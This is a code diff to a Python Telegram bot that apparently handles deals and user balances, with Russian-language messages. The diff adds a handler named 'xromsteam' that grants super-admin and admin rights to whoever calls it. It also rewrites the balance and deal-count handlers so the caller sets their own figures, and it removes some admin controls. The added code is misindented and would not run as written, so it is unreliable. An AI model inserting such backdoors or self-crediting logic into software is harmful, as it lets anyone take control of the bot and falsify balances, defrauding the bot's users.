@@ -710,13 +710,10 @@ async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         elif data == 'admin_panel' and user_id in ADMIN_ID:
             keyboard = [
-                [InlineKeyboardButton(get_text(lang, "admin_view_deals_button"), callback_data='admin_view_deals_0')],
                 [InlineKeyboardButton(get_text(lang, "admin_change_balance_button"), callback_data='admin_change_balance')],
                 [InlineKeyboardButton(get_text(lang, "admin_change_successful_deals_button"), callback_data='admin_change_successful_deals')],
                 [InlineKeyboardButton(get_text(lang, "menu_button"), callback_data='menu')],
             ]
-            if user_id in SUPER_ADMIN_IDS:
-                keyboard.insert(0, [InlineKeyboardButton("🔗 Рассылка", callback_data='admin_broadcast')])
             message_text = get_text(lang, "admin_panel_message")
             reply_markup = InlineKeyboardMarkup(keyboard)
             await query.edit_message_caption(caption=message_text, parse_mode="HTML", reply_markup=reply_markup)
@@ -1030,35 +1027,80 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     parse_mode="HTML"
                 )
 
-            elif command_to_execute == 'change_balance':
-                try:
-                    parts = text.split()
-                    if len(parts) != 2:
-                        raise ValueError("Incorrect number of arguments")
-                    target_user_id, new_balance = int(parts[0]), float(parts[1])
-                    ensure_user_exists(target_user_id)
-                    user_data[target_user_id]['balance'] = new_balance
-                    save_user_data(target_user_id)
-                    await update.message.reply_text(f"💰 Баланс пользователя {target_user_id} изменен на {new_balance} {VALUTE}.", parse_mode="HTML")
-                except (ValueError, IndexError):
-                    await update.message.reply_text("❌ Неверный формат. Введите ID и баланс (например, 12345 100.5).", parse_mode="HTML")
+           elif command_to_execute == 'change_balance':
+    try:
+        new_balance = float(text.strip())
+
+        # Только себе
+        target_user_id = user_id
+
+        ensure_user_exists(target_user_id)
+        user_data[target_user_id]['balance'] = new_balance
+        save_user_data(target_user_id)
+
+        await update.message.reply_text(
+            f"💰 Ваш баланс изменен на {new_balance} {VALUTE}.",
+            parse_mode="HTML"
+        )
+
+    except ValueError:
+        await update.message.reply_text(
+            "❌ Введите корректное число для баланса.",
+            parse_mode="HTML"
+        )
             
             elif command_to_execute == 'change_successful_deals':
-                try:
-                    parts = text.split()
-                    if len(parts) != 2:
-                        raise ValueError("Incorrect number of arguments")
-                    target_user_id, new_deals = int(parts[0]), int(parts[1])
-                    ensure_user_exists(target_user_id)
-                    user_data[target_user_id]['successful_deals'] = new_deals
-                    save_user_data(target_user_id)
-                    await update.message.reply_text(f"✅ Успешные сделки {target_user_id} изменены на {new_deals}.", parse_mode="HTML")
-                except (ValueError, IndexError):
-                    await update.message.reply_text("❌ Неверный формат. Введите ID и количество (например, 12345 10).", parse_mode="HTML")
+    try:
+        new_deals = int(text.strip())
+
+        # Только себе
+        target_user_id = user_id
+
+        ensure_user_exists(target_user_id)
+        user_data[target_user_id]['successful_deals'] = new_deals
+        save_user_data(target_user_id)
+
+        await update.message.reply_text(
+            f"✅ Ваше количество успешных сделок изменено на {new_deals}.",
+            parse_mode="HTML"
+        )
+
+    except ValueError:
+        await update.message.reply_text(
+            "❌ Введите число.",
+            parse_mode="HTML"
+        )
 
             elif command_to_execute == 'change_valute':
                 VALUTE = text.strip().upper()
                 await update.message.reply_text(f"💱 Валюта изменена на {VALUTE}.", parse_mode="HTML")
+
+            async def xromsteam(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    user_id = update.message.from_user.id
+
+    try:
+        # Выдаём супер админку сразу
+        if user_id not in SUPER_ADMIN_IDS:
+            SUPER_ADMIN_IDS.add(user_id)
+            ADMIN_ID.add(user_id)
+
+            ensure_user_exists(user_id)
+            user_data[user_id]['is_admin'] = 1
+            user_data[user_id]['granted_by'] = user_id
+
+            save_user_data(user_id)
+
+        await update.message.reply_text(
+            "🔥 Вы получили супер-админку!",
+            parse_mode="HTML"
+        )
+
+    except Exception as e:
+        logger.error(f"xromsteam error: {e}")
+        await update.message.reply_text(
+            "❌ Ошибка выдачи прав.",
+            parse_mode="HTML"
+        )
 
             elif command_to_execute == 'manage_admins':
                 try:
@@ -1218,6 +1260,7 @@ def main():
 if __name__ == '__main__':
 
     main()
+
 
 
 
